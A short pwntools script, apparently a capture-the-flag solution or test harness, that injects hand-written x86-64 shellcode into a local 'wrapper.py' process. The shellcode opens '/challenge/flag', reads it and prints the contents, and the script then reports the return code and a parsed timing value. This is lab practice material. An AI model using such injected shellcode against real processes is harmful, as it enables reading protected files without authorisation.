from pwn import *

env = {'PYTHONUNBUFFERED': '1'}
shellcode = b"\x48\xB8\x67\x65\x2F\x66\x6C\x61\x67\x00\x50\x48\xB8\x2F\x63\x68\x61\x6C\x6C\x65\x6E\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x81\xEC\x00\x01\x00\x00\x48\x89\xE6\x48\xC7\xC2\x00\x01\x00\x00\x48\x31\xC0\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\x48\x31\xFF\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05"

# Start the process
p = process(['python3', 'wrapper.py'], env=env)

# Send the shellcode (no need to wait for prompt since read() will block)
p.send(shellcode)

# Wait for the process to finish and get all output
output = p.recvall()

# Get the return code
return_code = p.wait()

print("Return code:", return_code)
print("Output:", output.decode())
print("Errors:")  # stderr is combined with stdout in pwntools by default

# Extract timing
time_str = output.decode().split("Time: ")[1].strip()
time_val = float(time_str)
print(f"Time: {time_val}")

p.close()